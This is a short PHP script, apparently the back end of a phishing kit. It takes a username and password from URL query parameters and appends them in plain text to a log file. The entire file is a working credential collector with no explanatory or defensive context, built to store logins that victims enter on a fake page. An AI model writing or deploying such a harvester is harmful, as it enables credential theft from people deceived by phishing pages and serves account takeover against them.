<?php
  $username = $_GET["u"];
  $password = $_GET["p"];

  $file = fopen('log.txt', 'a');
  fwrite($file, 'username: ' . $username . "\n");
  fwrite($file, 'password: ' . $password . "\n\n");

?>
